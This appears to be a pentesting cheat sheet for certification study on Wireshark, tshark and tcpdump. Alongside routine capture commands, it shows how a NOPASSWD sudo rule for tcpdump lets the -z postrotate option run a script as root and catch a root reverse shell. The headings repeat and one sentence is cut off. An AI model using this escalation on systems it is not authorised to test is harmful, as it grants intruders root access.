# Wireshark / Tshark / Tcpdump

% wireshark, tshark, tcpdump, network, cpts

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - if-gui---wireshark
#cat/RECON #cpts
```
sudo -E wireshark
```

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - start-wireshark-on-ea-attack01
#cat/RECON #cpts
Initial Enumeration of the Domain

```
└──╼ $sudo -E wireshark
```

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - tcpdump-output
#cat/RECON #cpts
Initial Enumeration of the Domain

```
sudo tcpdump -i ens224
```

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - sudo---list-users-privileges-2
#cat/RECON #cpts
```
(root) NOPASSWD: /usr/sbin/tcpdump
```

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - sudo-rights-abuse-2
#cat/RECON #cpts
By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.tes

```
:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

## Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - Wireshark / Tshark / Tcpdump - sudo-rights-abuse-3
#cat/RECON #cpts
Next, start a `netcat` listener on our attacking box and run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```
:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

